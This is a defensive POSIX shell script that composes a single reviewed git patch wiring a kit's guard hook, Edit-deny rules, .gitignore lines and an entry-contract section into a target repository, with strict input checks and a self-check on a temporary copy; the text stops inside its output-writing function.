#!/bin/sh
# adopt.sh — `sparkwright adopt`: compose ONE reviewed patch that wires the kit's guard into an existing repository.
#   sh scripts/adopt.sh <target-repo> --out <patch-file> [--replace-guard] [--selftest]
# Run it from a kit export or checkout, against the repository you are adopting the kit into. It reads the target, builds the patch for
# .claude/settings.json, the two guard scripts, .gitignore and the kit's entry-contract region in CLAUDE.md and AGENTS.md, applies it to a temp copy
# and checks the result with the kit's guard-wired.sh and the entry-contract leg of agents-brief.sh, and only then writes the patch to --out.
# The person reads the patch and applies it with git apply. Exit: 0 patch written, or nothing to patch · 1 the self-check refused the patch
# (nothing written) · 2 usage or a refused input (nothing written). POSIX sh; dash-clean.
# What it changes: Writes exactly one file, the patch at --out (mode 600, outside the target repository, never overwriting), and a mktemp -d work directory under TMPDIR (or /tmp, never inside the target) that it removes on exit; never writes inside the target repository, never writes .claude/ or any settings file, never edits CLAUDE.md or AGENTS.md itself (it only puts the new or changed one in the patch), never applies the patch, never calls the network or a forge.
# Guardrails: Refuses (exit 2, nothing written) a target that is not a repository root, a symlinked or dirty path it would patch (CLAUDE.md and AGENTS.md included), a CLAUDE.md or AGENTS.md holding a CR byte, an entry-contract section that is not the file's first one or has prose above it, a kit template it cannot read the region from, a TMPDIR that is unusable or inside the target, a CLAUDE.md or AGENTS.md that the kit's agents-brief.sh entry-contract check refuses as it stands (when there is nothing to patch), a --out inside the target or already present, a settings.json that fails the strict-parse gate or has the wrong shape, an unattributable guard.sh command, and a guard script that differs from the kit's unless --replace-guard; reads the wiring and the region from the kit's own files and never sources or evals anything from the target; never prints a settings value.
set -eu

ROOT=$(CDPATH='' cd "$(dirname "$0")/.." && pwd)
unset CDPATH GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE GIT_COMMON_DIR GIT_OBJECT_DIRECTORY GIT_ALTERNATE_OBJECT_DIRECTORIES GIT_CONFIG_COUNT GIT_CONFIG_PARAMETERS GIT_CONFIG GIT_CONFIG_SYSTEM

usage() { echo "usage: adopt.sh <target-repo> --out <patch-file> [--replace-guard] [--selftest]" >&2; exit 2; }
die2() { printf '%s\n' "adopt: $1" >&2; exit 2; }
die1() { printf '%s\n' "adopt: $1" >&2; exit 1; }
safe() { printf '%s' "$1" | tr -d '[:cntrl:]' | cut -c1-120; }

DENIES='["Edit(/.claude/**)","Edit(/hooks/**)","Edit(/.kit/**)"]'
GUARD_RE='\A[[:space:]]*((sh|bash)[[:space:]]+)?["\x27]?(\./|\$CLAUDE_PROJECT_DIR/|\$\{CLAUDE_PROJECT_DIR\}/|"\$CLAUDE_PROJECT_DIR"/|"\$\{CLAUDE_PROJECT_DIR\}"/)?\.claude/hooks/guard\.sh["\x27]?[[:space:]]*\z'   # MUT-SUBSTR
GUARDS="guard.sh guard-core.sh"
# The set is fixed to the two names every adapter manifest declares today. A kit adapter that declares a third contextFile makes the lock fail closed here (exit 1) until this list grows.
EC_FILES="CLAUDE.md AGENTS.md"
PATHS=".claude/settings.json .claude/hooks/guard.sh .claude/hooks/guard-core.sh .gitignore $EC_FILES"
TPL="$ROOT/templates/PROJECT-CLAUDE-TEMPLATE.md"

gitx() { env GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null GIT_OPTIONAL_LOCKS=0 git -c core.fsmonitor=false -c core.hooksPath=/dev/null "$@"; }
gg() { gitx -c user.name=adopt -c user.email=adopt@invalid -c commit.gpgsign=false -c core.fileMode=true -c core.autocrlf=false -c core.safecrlf=false -c diff.renames=false -c init.defaultBranch=main "$@"; }
jqw() { jq --indent 2 --arg c "$GW_CANON" --arg m "$MATCHER" --arg re "$GUARD_RE" --argjson d "$DENIES" "$@"; }

jq_ok() {  # jq 1.7 or later: an older jq rewrites some numbers (a large integer, 1.0)
  _jv=$(jq --version 2>/dev/null) || return 1
  _jv=${_jv#jq-}; _jmaj=${_jv%%.*}; _jr=${_jv#*.}; _jmin=${_jr%%[!0-9]*}
  case "$_jmaj$_jmin" in ''|*[!0-9]*) return 1 ;; esac
  [ "$_jmaj" -gt 1 ] || { [ "$_jmaj" -eq 1 ] && [ "$_jmin" -ge 7 ]; }
}
need_tools() {
  command -v git >/dev/null 2>&1 || die2 "git is required"
  command -v jq >/dev/null 2>&1 || die2 "jq 1.7 or later is required (install it: brew install jq, or apt-get install jq)"
  jq_ok || die2 "jq 1.7 or later is required: an older jq rewrites some numbers (found $(jq --version 2>&1))"
  command -v sha256sum >/dev/null 2>&1 || command -v shasum >/dev/null 2>&1 || die2 "sha256sum or shasum is required"
}
sha256() { if command -v sha256sum >/dev/null 2>&1; then sha256sum "$1" | cut -d' ' -f1; else shasum -a 256 "$1" | cut -d' ' -f1; fi; }

# --- the strict-parse gate: a copy of conformance/guard-wired.sh's _gw_bd_gate tests (one A4 cell per refusal pins the copy) ---
GW_BD_DUPJQ='reduce inputs as $e ({seen: {}, closed: {}, prev: [], dup: false};
  $e[0] as $p |
  if ($e | length) == 1 then
    (if ($p | length) == 1 then . else .closed[($p[0:($p | length) - 1] | tojson)] = true end)
  else
    reduce range(0; $p | length) as $i (.;
      ($p[0:$i + 1]) as $pre | ($pre | tojson) as $k |
      if ($i != (($p | length) - 1)) and (.prev[0:$i + 1] == $pre) and ((.closed[$k] // false) | not) then .
      elif .seen[$k] then .dup = true
      else .seen[$k] = true | .closed[$k] = false
      end)
    | .prev = $p
    | if (($e[1] | type) == "object") or (($e[1] | type) == "array") then .closed[($p | tojson)] = true else . end
  end) | .dup'
bd_dupkeys() {
  _dk=$(jq -n --stream "$GW_BD_DUPJQ" "$1" 2>/dev/null) || return 1
  [ "$_dk" = false ]
}
bd_strict() {
  [ "$(LC_ALL=C tr -d '\011\012\015\040-\377' < "$1" 2>/dev/null | wc -c | tr -d ' ')" = 0 ] || return 1
  [ "$(head -c 3 "$1" 2>/dev/null | od -An -tx1 | tr -d ' \n')" != efbbbf ] || return 1
  awk '{ gsub(/\r/, " "); gsub(/"([^"\\]|\\.)*"/, ""); gsub(/[][{},:]/, " ")
         for (i = 1; i <= NF; i++) { t = $i
           if (t == "true" || t == "false" || t == "null") continue
           if (t ~ /^-?(0|[1-9][0-9]*)(\.[0-9]+)?([eE][+-]?[0-9]+)?$/) continue
           bad = 1 } }
       END { exit bad }' "$1" 2>/dev/null
}
strict_gate() {  # <file>: exits 2 naming the test that failed
  jq -e . "$1" >/dev/null 2>&1 || die2 "settings.json is not valid JSON"
  _gn=$(jq -n '[inputs] | length' "$1" 2>/dev/null) || _gn=0
  [ "$_gn" = 1 ] || die2 "settings.json holds more than one JSON document (a reader sees only one of them)"
  bd_strict "$1" || die2 "settings.json is not strict JSON (a control byte, a BOM, or a NaN, Infinity, leading-zero, .5 or +1 number): jq reads it but Claude Code cannot"
  bd_dupkeys "$1" || die2 "settings.json has a duplicate JSON key (a rewrite would drop one of the copies silently)"
  jq -e '[.. | objects | keys_unsorted[] | select(. == "__proto__" or . == "constructor" or . == "prototype")] | length == 0' "$1" >/dev/null 2>&1 \
    || die2 "settings.json uses the key __proto__, constructor or prototype"
}
SHAPE='type == "object"
  and ((has("hooks") | not) or (.hooks | type == "object"))
  and ((has("permissions") | not) or (.permissions | type == "object"))
  and (((.hooks // {}) | has("PreToolUse") | not) or (.hooks.PreToolUse | type == "array"))
  and (((.permissions // {}) | has("deny") | not) or (.permissions.deny | type == "array"))
  and all(.hooks.PreToolUse[]?; type == "object" and ((has("hooks") | not) or (.hooks | type == "array")))
  and all(.hooks.PreToolUse[]?.hooks[]?; type == "object")'

# --- the jq edits (design 2.3): a guard entry is a command that IS the canonical command, or is only a run of .claude/hooks/guard.sh (the whole command, anchored) ---
JQ_DEFS='def isg: ((.command // "") | if type == "string" then (. == $c or test($re)) else false end);
def kit: {matcher: $m, hooks: [{type: "command", command: $c}]};   # FAULT-KIT
def step($el):
  ($el.hooks // []) as $hs
  | ($hs | map(isg)) as $f
  | if ($f | any | not) then .out += [$el]
    elif .seen then
      ($el | .hooks = [$hs[] | select(isg | not)]) as $e2
      | if ($e2.hooks | length) > 0 then .out += [$e2] else . end
    else
      ($f | index(true)) as $i
      | ($hs[$i] | .command = $c) as $g
      | [$hs[] | select(isg | not)] as $oth
      | .seen = true
      | if ($oth | length) == 0 then .out += [$el | .matcher = $m | .hooks = [$g]]
        elif $el.matcher == $m then .out += [$el | .hooks = [$hs | to_entries[] | select((.value | isg | not) or .key == $i) | .value | if isg then .command = $c else . end]]   # MUT-REMATCH
        else .out += [($el | .hooks = $oth), {matcher: $m, hooks: [$g]}]
        end
    end;
'
EDIT_MAIN='. as $doc
| ([$d[] | select(. as $x | ($doc.permissions.deny // []) | any(.[]; . == $x) | not)]) as $miss   # FAULT-DENY
| (if ([.hooks.PreToolUse[]?.hooks[]? | select(isg)] | length) > 0
   then .hooks.PreToolUse = (reduce .hooks.PreToolUse[] as $el ({out: [], seen: false}; step($el)) | .out)
   else .hooks.PreToolUse = ((.hooks.PreToolUse // []) + [kit]) end)
| if ($miss | length) == 0 then . else .permissions.deny = ((.permissions.deny // []) + $miss) end   # MUT-DROPKEY
'
# The do-no-harm proof: with every guard entry (and an element left empty by that), the three denies and any emptied container removed, both documents are equal.
STRIP='def strip:
  (if (.hooks.PreToolUse? // null) != null then .hooks.PreToolUse |= [.[] | (.hooks // []) as $h | ($h | map(isg)) as $f
      | if ($f | any | not) then . else (.hooks = [$h[] | select(isg | not)]) | if (.hooks | length) == 0 then empty else . end end] else . end)
  | (if (.permissions.deny? // null) != null then .permissions.deny |= map(select(. as $x | $d | any(.[]; . == $x) | not)) else . end)
  | del(.hooks.PreToolUse | select(. == []))
  | del(.hooks | select(. == {}))
  | del(.permissions.deny | select(. == []))
  | del(.permissions | select(. == {}));
$a[0] as $o | $b[0] as $n | ($o | strip) == ($n | strip)'

sem_equal() { [ "$(jq -S . "$1")" = "$(jq -S . "$2")" ]; }   # MUT-NOIDEM
denies_ok() { jq -e --argjson d "$DENIES" '. as $s | all($d[]; . as $x | ($s.permissions.deny // []) | any(.[]; . == $x))' "$1" >/dev/null 2>&1; }
edit_settings() { jqw "$JQ_DEFS $EDIT_MAIN" "$1"; }

# --- the wiring: one source each, read and never sourced (design 2.2 step 7) ---
extract_canon() {  # <guard-wired.sh> -> the one GW_CANON command; rc 1 when the line is missing or doubled
  [ "$(grep -c "^GW_CANON='" "$1" 2>/dev/null)" = 1 ] || return 1
  sed -n "s/^GW_CANON='\\(.*\\)'\$/\\1/p" "$1" | sed "s/'\\\\''/'/g"
}
fence_cmds() { sed -n 's/^[[:space:]]*\({ "type": "command", "command": .* }\)[[:space:]]*$/\1/p' "$1"; }
check_fences() {
  [ -f "$ROOT/docs/adoption/brownfield.md" ] || die2 "docs/adoption/brownfield.md is missing from the kit (it ships in the export); its two guard commands are checked against GW_CANON"
  _fcs=$(fence_cmds "$ROOT/docs/adoption/brownfield.md")
  _fn=$(printf '%s\n' "$_fcs" | grep -c . || true)
  _fok=$(printf '%s\n' "$_fcs" | jq -r '.command' 2>/dev/null | grep -cxF -- "$GW_CANON" || true)
  { [ "$_fn" = 2 ] && [ "$_fok" = 2 ]; } || die2 "docs/adoption/brownfield.md must hold exactly two guard commands, each equal to GW_CANON in conformance/guard-wired.sh"
}
read_wiring() {
  _gwf="$ROOT/conformance/guard-wired.sh"; _ks="$ROOT/.claude/settings.json"
  { [ -f "$_gwf" ] && [ -f "$_ks" ]; } || die2 "run adopt from a kit export or checkout: its conformance/guard-wired.sh and .claude/settings.json are the wiring's sources"
  GW_CANON=$(extract_canon "$_gwf") || GW_CANON=""
  [ -n "$GW_CANON" ] || die2 "conformance/guard-wired.sh must hold exactly one GW_CANON line"
  check_fences
  MATCHER=$(jq -r --arg c "$GW_CANON" '[.hooks.PreToolUse[]? | select(any(.hooks[]?; (.command // "") == $c))] | if length == 1 then (.[0].matcher // "") else "" end' "$_ks" 2>/dev/null) || MATCHER=""
  [ -n "$MATCHER" ] || die2 "the kit's .claude/settings.json must hold exactly one PreToolUse element running the canonical guard command, with a matcher"
  denies_ok "$_ks" || die2 "the kit's .claude/settings.json lacks one of the three Edit denies (Edit(/.claude/**), Edit(/hooks/**), Edit(/.kit/**))"
}

# --- the target (design 2.2 steps 1-6) ---
check_target() {
  case "$TARGET" in ''|*[[:cntrl:]]*) die2 "the target path is empty or has control characters" ;; esac
  [ -d "$TARGET" ] || die2 "the target '$(safe "$TARGET")' is not a directory"
  TROOT=$(CDPATH='' cd -P "$TARGET" 2>/dev/null && pwd -P) || die2 "cannot resolve the target"
  _kreal=$(CDPATH='' cd -P "$ROOT" && pwd -P)
  [ "$TROOT" != "$_kreal" ] || die2 "the target is the kit itself; give the repository you are adopting the kit into"
  case "$TROOT/" in "$_kreal"/*) die2 "the target is inside the kit checkout" ;; esac
  _top=$(gitx -C "$TROOT" rev-parse --show-toplevel 2>/dev/null) || die2 "the target is not a git work tree"
  _top=$(CDPATH='' cd -P "$_top" 2>/dev/null && pwd -P) || die2 "cannot resolve the target's repository root"
  [ "$_top" = "$TROOT" ] || die2 "the target is inside a repository whose root is elsewhere; give the repository root"
}
want_type() {  # <path> <d|f>
  [ -e "$TROOT/$1" ] || return 0
  case "$2" in d) [ -d "$TROOT/$1" ] ;; *) [ -f "$TROOT/$1" ] ;; esac || die2 "$1 is not a regular file or directory of the expected kind"
}
check_paths() {
  for _p in .claude .claude/hooks .claude/settings.json .claude/hooks/guard.sh .claude/hooks/guard-core.sh .gitignore $EC_FILES; do
    [ ! -L "$TROOT/$_p" ] || die2 "$_p is a symbolic link; the verb will not read or patch through one"
  done
  want_type .claude d; want_type .claude/hooks d
  want_type .claude/settings.json f; want_type .claude/hooks/guard.sh f; want_type .claude/hooks/guard-core.sh f; want_type .gitignore f
  for _p in $EC_FILES; do want_type "$_p" f; done
  _st=$(gitx -C "$TROOT" status --porcelain=v1 --untracked-files=all -- $PATHS 2>/dev/null) || die2 "git status failed in the target"
  if printf '%s\n' "$_st" | grep -v '^??' | grep -q .; then
    die2 "a path the patch touches has an uncommitted change in the target (commit or stash it first): $(printf '%s' "$_st" | grep -v '^??' | head -n 1 | cut -c1-80)"
  fi
}
check_out() {
  case "$OUT" in
    *[[:cntrl:]]*) die2 "--out has control characters" ;;
    *"'"*) die2 "--out must not contain a single quote (the git apply line printed at the end quotes the path)" ;;
  esac
  _od=$(dirname -- "$OUT"); _ob=$(basename -- "$OUT")
  case "$_ob" in ''|.|..) die2 "--out must name a file" ;; esac
  [ -d "$_od" ] || die2 "the directory for --out does not exist"
  _odr=$(CDPATH='' cd -P "$_od" 2>/dev/null && pwd -P) || die2 "cannot resolve the directory for --out"
  OUTREAL="$_odr/$_ob"
  case "$OUTREAL/" in "$TROOT"/*) die2 "--out must be outside the target repository, so the repository is changed by nothing" ;; esac
  { [ ! -e "$OUTREAL" ] && [ ! -L "$OUTREAL" ]; } || die2 "--out already exists; the verb never overwrites a file"
}
tmp_parent() {  # TPARENT = the physical directory the work directory goes in, ${TMPDIR:-/tmp}; refused when it is unusable or inside the target, before anything is created (BSD mktemp -d ignores TMPDIR, so the parent is named to it)
  _tp=$(CDPATH='' cd -P "${TMPDIR:-/tmp}" 2>/dev/null && pwd -P) || die2 "TMPDIR is not a usable directory; set it to one outside the target, then rerun"
  case "$_tp/" in "$TROOT"/*) die2 "TMPDIR points inside the target repository; set TMPDIR outside it, then rerun" ;; esac
  TPARENT=$_tp
}
check_tmp() {  # a backstop after mktemp: the work directory must never sit inside the target (the EXIT trap removes it on the refusal)
  _tr=$(CDPATH='' cd -P "$T" 2>/dev/null && pwd -P) || die2 "cannot resolve the work directory"
  case "$_tr/" in "$TROOT"/*) die2 "TMPDIR points inside the target repository; set TMPDIR outside it, then rerun" ;; esac
}
check_settings() {
  [ -f "$SJ" ] || return 0
  strict_gate "$SJ"   # MUT-NOGATE
  jq -e "$SHAPE" "$SJ" >/dev/null 2>&1 || die2 "settings.json has the wrong shape: hooks and permissions must be objects, hooks.PreToolUse and permissions.deny arrays, every element and hook entry an object"
  _bad=$(jq -r --arg re "$GUARD_RE" --arg c "$GW_CANON" '[(.hooks.PreToolUse // []) | to_entries[] | .key as $i | ((.value.hooks // []) | to_entries[] | .key as $j
      | select((.value.command // "") | if type == "string" then (. != $c and test("guard\\.sh") and (test($re) | not)) else false end)
      | "hooks.PreToolUse[\($i)].hooks[\($j)]")] | .[0] // empty' "$SJ" 2>/dev/null) || _bad=""
  [ -z "$_bad" ] || die2 "the hook command at $(safe "$_bad") names guard.sh but is not only a run of the kit's .claude/hooks/guard.sh; the verb will not rewrite a command it cannot attribute (its text is not printed)"
}
plan_guards() {  # GUARD_WRITE = the guard scripts the patch carries
  GUARD_WRITE=""
  for _g in $GUARDS; do
    _k="$ROOT/.claude/hooks/$_g"; _t="$T/base/.claude/hooks/$_g"
    [ -f "$_k" ] || die2 "the kit's .claude/hooks/$_g is missing"
    if [ ! -e "$_t" ]; then GUARD_WRITE="$GUARD_WRITE $_g"; continue; fi
    if cmp -s "$_k" "$_t"; then continue; fi
    [ "$REPLACE" -eq 1 ] || die2 ".claude/hooks/$_g differs from the kit's (yours sha256 $(sha256 "$_t"), the kit's $(sha256 "$_k")). The whole verb stops here, the settings wiring included. Guard scripts carry no release marker, so the verb cannot tell an older kit copy from a newer one or from a foreign file; to put the kit's copy in the patch, run again with --replace-guard"
    GUARD_WRITE="$GUARD_WRITE $_g"
  done
}

# --- the plan: what the patch changes, each decided semantically (design 2.3) ---
plan_settings() {  # SET_STATE none|new|changed; REFORMAT 0|1; writes $T/old.json and $T/settings.new
  SET_STATE=none; REFORMAT=0
  if [ -f "$SJ" ]; then cp "$SJ" "$T/old.json"; else printf '{}\n' > "$T/old.json"; fi
  edit_settings "$T/old.json" > "$T/settings.new" || die1 "jq could not compose the settings edit; nothing was written"
  if [ ! -f "$SJ" ]; then SET_STATE=new; return 0; fi
  if sem_equal "$SJ" "$T/settings.new"; then return 0; fi
  SET_STATE=changed
  jq --indent 2 . "$SJ" > "$T/pretty"
  cmp -s "$SJ" "$T/pretty" || REFORMAT=1
}
gi_missing() {
  for _l in .claude/settings.local.json .kit-run/; do
    if [ ! -f "$GI" ] || ! grep -qxF -- "$_l" "$GI"; then printf '%s\n' "$_l"; fi
  done
}
new_gitignore() {
  if [ -f "$GI" ]; then cat "$GI"; [ -z "$(tail -c 1 "$GI")" ] || printf '\n'; fi
  printf '%s\n' "# Local per-developer files, never committed (sparkwright adopt)" "$GI_MISSING"
}

# --- the entry contract (errata E1): the region is the first "## " section of the kit's template, the closing heading is the next "## " line ---
region_of() { LC_ALL=C awk '/^## /{n++; if (n == 2) exit} n == 1' "$1"; }   # a file's first "## " section, every line, newline included
closing_of() { LC_ALL=C awk '/^## /{n++; if (n == 2) {print; exit}}' "$1"; }
preamble_ok() {  # only blank lines and at most one "# " title above the first "## " line
  LC_ALL=C awk '/^## /{exit} /^[[:space:]]*$/{next} /^# /{t++; if (t > 1) {bad = 1; exit} next} {bad = 1; exit} END{exit bad + 0}' "$1"
}
load_region() {  # writes $T/region and $T/closing from the kit's template; an empty one is a damaged kit
  mkdir -p "$T/ec"
  [ -f "$TPL" ] || die2 "the kit's templates/PROJECT-CLAUDE-TEMPLATE.md is missing, so the entry contract cannot be read; use a complete kit export or checkout, then rerun"
  region_of "$TPL" > "$T/region" || die2 "the kit's templates/PROJECT-CLAUDE-TEMPLATE.md could not be read; use a complete kit export or checkout, then rerun"   # FAULT-REGION
  closing_of "$TPL" > "$T/closing" || die2 "the kit's templates/PROJECT-CLAUDE-TEMPLATE.md could not be read; use a complete kit export or checkout, then rerun"
  { [ -s "$T/region" ] && [ -s "$T/closing" ]; } || die2 "the kit's templates/PROJECT-CLAUDE-TEMPLATE.md has no entry-contract section, or no '## ' heading after it; this kit copy is damaged, so use a fresh kit export and rerun"
}
ins_line() {  # the line the region goes before: after a leading "# " title and the blank lines after it, else the top
  LC_ALL=C awk '
    !seen && /^[[:space:]]*$/ { next }
    !seen { seen = 1; if ($0 ~ /^# /) { title = 1; next }; print 1; done = 1; exit }
    title && /^[[:space:]]*$/ { next }
    title { print NR; done = 1; exit }
    END { if (!done) print (title ? NR + 1 : 1) }' "$1"
}
insert_region() {  # <file> -> stdout: the region and the closing heading in, the file's own content following the closing heading
  _ins=$(ins_line "$1")   # MUT-INSBELOW
  if [ "$_ins" -gt 1 ]; then
    head -n "$((_ins - 1))" "$1" > "$T/head"; cat "$T/head"
    [ -z "$(tail -c 1 "$T/head")" ] || echo   # a last line with no newline still ends before the region
    if [ -n "$(tail -n 1 "$T/head")" ]; then echo; fi
  fi
  cat "$T/region" "$T/closing"
  tail -n +"$_ins" "$1" > "$T/rest"
  if [ -s "$T/rest" ]; then echo; cat "$T/rest"; fi
}
sec_lines() { LC_ALL=C awk '/^## /{n++; if (n == 1) a = NR; if (n == 2) {b = NR; exit}} END{print a + 0, b + 0}' "$1"; }   # the line numbers of the first and second "## " lines (0 = none); awk prints numbers, never content
replace_region() {  # <file> -> stdout: the old first "## " section swapped for the kit's; spliced by line number, so every byte outside it is unchanged
  _sl=$(sec_lines "$1"); _sa=${_sl% *}; _sz=${_sl#* }
  [ "$_sa" -le 1 ] || head -n "$((_sa - 1))" "$1"
  cat "$T/region"
  if [ "$_sz" -gt 0 ]; then tail -n +"$_sz" "$1"; else cat "$T/closing"; fi   # an only section: the kit's closing heading follows the region
}
ec_note() { printf '%s\n' "$2" > "$T/ec/$1.kind"; EC_WRITE="$EC_WRITE $1"; }
plan_same() {  # <name>: the first section is the kit's region; judge the line after it (placement rule 3)
  _c=$(closing_of "$T/base/$1")
  if [ -z "$_c" ]; then cat "$T/base/$1" "$T/closing" > "$T/ec/$1"; ec_note "$1" close; fi   # a closing heading that is there is judged by agents-brief.sh (as_is_lock, or the self-check), the one judge of what renders
}
plan_old() {  # <name>: the file's first "## " heading begins "## 1. Entry contract"
  preamble_ok "$T/base/$1" || die2 "$1 has prose above its old entry contract (placement rule 1: only blank lines and one '# ' title may precede it); move the prose below the region, or delete the old region, then rerun"
  region_of "$T/base/$1" > "$T/cur"
  if cmp -s "$T/cur" "$T/region"; then plan_same "$1"; return 0; fi
  replace_region "$T/base/$1" > "$T/ec/$1" || die1 "could not compose the replacement for $1; nothing was written"
  ec_note "$1" replace
}
plan_file() {  # <name>: absent -> a new file; identical -> nothing; old region -> replaced; none -> inserted; misplaced -> refused
  _b="$T/base/$1"
  if [ ! -e "$_b" ]; then cat "$T/region" "$T/closing" > "$T/ec/$1"; ec_note "$1" new; return 0; fi
  [ "$(LC_ALL=C tr -cd '\r' < "$_b" | wc -c | tr -d ' ')" = 0 ] || die2 "$1 has CR (Windows) line endings, and a region spliced into them would mix line endings; convert it to LF line endings and commit that, then rerun"
  _h=$(LC_ALL=C awk '/^## /{print; exit}' "$_b")
  case "$_h" in
    "## 1. Entry contract"*) plan_old "$1"; return 0 ;;
  esac
  if grep -q '^## 1\. Entry contract' "$_b"; then
    die2 "$1 has a '## 1. Entry contract' section that is not its first '## ' section, and the verb will not guess which one is the kit's; move it to the top, or delete it, then rerun"
  fi
  insert_region "$_b" > "$T/ec/$1" || die1 "could not compose the insertion for $1; nothing was written"
  ec_note "$1" insert
}
plan_entry() {  # EC_WRITE = the files the patch carries; $T/ec/<name> holds the new bytes and $T/ec/<name>.kind how they come about
  EC_WRITE=""
  for _f in $EC_FILES; do plan_file "$_f"; done
}
already() { echo "already adopted: nothing to patch (guard scripts current, settings wired, .gitignore lines present, entry contract current)"; }

# --- the patch: a temp git repo holds the target's current bytes, the changes go on top, git diff makes the patch ---
snapshot_base() {  # the four paths are copied once; every later read, edit and the patch itself use the copy
  mkdir -p "$T/base"
  for _p in $PATHS; do
    [ -f "$TROOT/$_p" ] || continue
    [ ! -L "$TROOT/$_p" ] || die2 "$_p is a symbolic link; the verb will not read or patch through one"
    mkdir -p "$T/base/$(dirname "$_p")"
    cp -p "$TROOT/$_p" "$T/base/$_p"
    { [ -f "$T/base/$_p" ] && [ ! -L "$T/base/$_p" ]; } || die2 "$_p changed while it was being read; run again"
  done
}
compose() {
  cp -Rp "$T/base" "$T/w"
  gg init -q "$T/w" || die1 "git init failed in the work directory; nothing was written"
  gg -C "$T/w" add -A -f || die1 "git add failed in the work directory; nothing was written"
  gg -C "$T/w" commit -q --allow-empty -m base || die1 "git commit failed in the work directory; nothing was written"
  if [ "$SET_STATE" != none ]; then mkdir -p "$T/w/.claude"; cat "$T/settings.new" > "$T/w/.claude/settings.json"; fi
  for _g in $GUARD_WRITE; do
    mkdir -p "$T/w/.claude/hooks"; cat "$ROOT/.claude/hooks/$_g" > "$T/w/.claude/hooks/$_g"; chmod 755 "$T/w/.claude/hooks/$_g"
  done
  if [ -n "$GI_MISSING" ]; then new_gitignore > "$T/gi.new"; cat "$T/gi.new" > "$T/w/.gitignore"; fi
  for _f in $EC_WRITE; do cat "$T/ec/$_f" > "$T/w/$_f"; done
  gg -C "$T/w" add -A -f || die1 "git add failed in the work directory; nothing was written"
  gg -C "$T/w" diff --cached --no-color --no-ext-diff --src-prefix=a/ --dst-prefix=b/ > "$T/patch" || die1 "git diff failed in the work directory; nothing was written"
}

# --- the self-check (design 2.4): apply to a copy, then guard-wired's own rung 1 plus the verb's assertions ---
verify_applied() {
  cp -Rp "$T/base" "$T/chk"
  gg init -q "$T/chk" || die1 "git init failed in the check directory; nothing was written"
  gg -C "$T/chk" apply --whitespace=nowarn --check "$T/patch" || die1 "git apply --check refused the patch just composed; nothing was written"
  gg -C "$T/chk" apply --whitespace=nowarn "$T/patch" || die1 "git apply failed on the copy; nothing was written"
  _cs="$T/chk/.claude/settings.json"
  [ -f "$_cs" ] || die1 "the applied copy has no .claude/settings.json; nothing was written"
  _o=$(sh "$ROOT/conformance/guard-wired.sh" --rung1-only "$T/chk" 2>&1) && _rc=0 || _rc=$?
  [ "$_rc" -eq 0 ] || { printf '%s\n' "$_o" >&2; die1 "guard-wired.sh --rung1-only refused the applied copy; nothing was written"; }
  _wn=$(printf '%s\n' "$_o" | grep -c '^WARN:' || true)   # MUT-IGNWARN
  [ "$_wn" -eq 0 ] || { printf '%s\n' "$_o" >&2; die1 "guard-wired.sh warns on the applied copy (on a non-kit tree a wrong guard command is only a WARN, which counts as a failure here); nothing was written"; }
  denies_ok "$_cs" || die1 "the applied copy lacks one of the three Edit denies (--rung1-only does not check them); nothing was written"   # MUT-NODENY
  jqw -e "$JQ_DEFS"'[.hooks.PreToolUse[]?.hooks[]? | select(isg) | .command] | (length > 0) and all(. == $c)' "$_cs" >/dev/null 2>&1 \
    || die1 "a guard hook command in the applied copy is not the canonical command; nothing was written"
  jqw -n -e --slurpfile a "$T/old.json" --slurpfile b "$_cs" "$JQ_DEFS $STRIP" >/dev/null 2>&1 \
    || die1 "the applied settings differ from yours by more than the named additions; nothing was written"
  verify_entry
}
# agents-brief.sh takes no root argument and runs three legs from its working directory; only the middle one grades the patch (errata E1)
ec_leg() {  # <agents-brief output> -> the lines between its two header lines; rc 1 when either header is missing (fail closed if the script's output changes)
  [ "$(printf '%s\n' "$1" | grep -c '^Entry-contract lock')" = 1 ] || return 1
  [ "$(printf '%s\n' "$1" | grep -c '^Operator card pin')" = 1 ] || return 1
  printf '%s\n' "$1" | awk '/^Entry-contract lock/{on = 1; next} /^Operator card pin/{exit} on'
}
ec_graded() {  # <leg text>: rc 0 iff it holds no FAIL or UNVERIFIED line and at least one PASS line
  [ "$(printf '%s\n' "$1" | grep -Ec '^(FAIL|UNVERIFIED):' || true)" = 0 ] || return 1   # MUT-ECFAIL
  [ "$(printf '%s\n' "$1" | grep -c '^PASS:' || true)" -ge 1 ]
}
ec_lock_run() {  # <dir>: the kit's adapter manifests go into <dir>, agents-brief.sh runs there; _ecl = its entry-contract leg; rc 0 iff that leg grades clean
  for _m in "$ROOT"/adapters/*/adapter.json; do
    [ -f "$_m" ] || continue
    _md="$1/adapters/$(basename "$(dirname "$_m")")"; mkdir -p "$_md"; cp "$_m" "$_md/adapter.json"
  done
  _ab=$(cd "$1" && sh "$ROOT/conformance/agents-brief.sh" 2>&1) || true
  _ecl=$(ec_leg "$_ab") || _ecl=""
  ec_graded "$_ecl"
}
ec_leg_show() {  # the leg's lines to stderr, each through safe()
  if [ -n "$_ecl" ]; then printf '%s\n' "$_ecl" | while IFS= read -r _ln; do printf '%s\n' "$(safe "$_ln")" >&2; done; else echo "adopt: the entry-contract section was not found in agents-brief.sh's output" >&2; fi
}
as_is_lock() {  # nothing to patch: the target's CLAUDE.md and AGENTS.md as they stand must pass the lock leg, or "current" would be a claim nobody graded
  mkdir -p "$T/asis"
  for _f in $EC_FILES; do
    [ -f "$T/base/$_f" ] || die2 "$_f is missing where the patch should have added it; run again"
    cp "$T/base/$_f" "$T/asis/$_f"
  done
  ec_lock_run "$T/asis" || { ec_leg_show; die2 "agents-brief.sh's entry-contract check refuses your CLAUDE.md or AGENTS.md as they stand (see the lines above); fix what it names, then rerun"; }
}
verify_entry() {  # the lock's entry-contract leg on the applied copy, then the byte check the lock cannot make (it compares members with each other)
  ec_lock_run "$T/chk" || { ec_leg_show; die1 "conformance/agents-brief.sh's entry-contract check refused the applied copy; nothing was written"; }
  region_of "$TPL" > "$T/kit.region"
  for _f in $EC_FILES; do
    region_of "$T/chk/$_f" > "$T/chk.sec"
    cmp -s "$T/kit.region" "$T/chk.sec" || die1 "the applied $_f does not open with the kit's entry contract byte for byte (the lock only compares the files with each other); nothing was written"   # MUT-REGBYTES
  done
}

write_out() {
  :   # MUT-WRITEDIRECT
  # one open, no-clobber, mode 600: the file is created and written through the same descriptor, so nothing can be swapped in between
  ( umask 077; set -C; exec 3> "$OUTREAL" || exit 3; cat "$T/patch" >&3 || exit 4 ) 2>/dev/null && _wr=0 || _wr=$?
